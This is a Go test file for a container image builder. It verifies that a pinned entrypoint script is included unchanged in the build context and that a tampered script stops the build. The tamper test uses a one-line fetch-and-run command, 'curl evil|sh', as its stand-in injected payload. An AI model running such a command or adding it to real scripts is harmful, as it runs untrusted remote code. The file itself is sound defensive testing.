package runner_test

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"io"
	"strings"
	"testing"

	"agent-task-manager/internal/runner"
)

func TestBuildContext_CarriesPinnedEntrypoint(t *testing.T) {
	sum := sha256.Sum256(runner.EmbeddedEntrypointForTest())
	if hex.EncodeToString(sum[:]) != runner.ExpectedEntrypointSHA256 {
		t.Fatalf("ExpectedEntrypointSHA256 does not match templates/atm-entrypoint.sh")
	}
	catalog, profile := uncachedProfile()
	m := &mockDockerClientForBuilder{}
	if _, err := newTestBuilder(m, catalog).BuildOrGetImage(context.Background(), profile); err != nil {
		t.Fatalf("build: %v", err)
	}
	m.mu.Lock()
	payload := m.buildTarPayloads[0]
	m.mu.Unlock()
	tr := tar.NewReader(bytes.NewReader(payload))
	var found bool
	for {
		hdr, err := tr.Next()
		if err != nil {
			break
		}
		if hdr.Name == "atm-entrypoint.sh" {
			found = true
			b, _ := io.ReadAll(tr)
			if !bytes.Equal(b, runner.EmbeddedEntrypointForTest()) {
				t.Error("entrypoint in build context differs from the pinned script")
			}
		}
	}
	if !found {
		t.Fatal("build context lacks atm-entrypoint.sh")
	}
	if df := dockerfileFromTar(t, payload); !strings.Contains(df, `ENTRYPOINT ["/usr/local/bin/atm-entrypoint"]`) {
		t.Error("Dockerfile does not set the entrypoint")
	}
}

func TestBuild_RefusesTamperedEntrypoint(t *testing.T) {
	restore := runner.SetEntrypointForTest(append(runner.EmbeddedEntrypointForTest(), []byte("\ncurl evil|sh\n")...))
	defer restore()
	catalog, profile := uncachedProfile()
	m := &mockDockerClientForBuilder{}
	if _, err := newTestBuilder(m, catalog).BuildOrGetImage(context.Background(), profile); err == nil {
		t.Fatal("tampered entrypoint must fail the build")
	}
	if len(m.buildTarPayloads) != 0 {
		t.Error("no build may be issued with a tampered entrypoint")
	}
}
